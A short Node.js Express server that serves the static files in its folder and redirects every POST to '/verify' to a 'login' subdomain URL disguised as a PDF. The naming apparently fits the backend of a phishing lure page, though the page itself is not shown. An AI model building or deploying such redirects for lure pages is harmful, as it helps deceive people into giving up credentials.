const express = require('express');
const path = require('path');
const app = express();

// Serve files from the current folder (where index.html is)
app.use(express.static(__dirname));

// Redirect endpoint
app.post('/verify', (req, res) => {
  res.redirect('https://login.fudgekic.biz/view/project-details.pdf');   // ← change this to the URL you want
});   

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
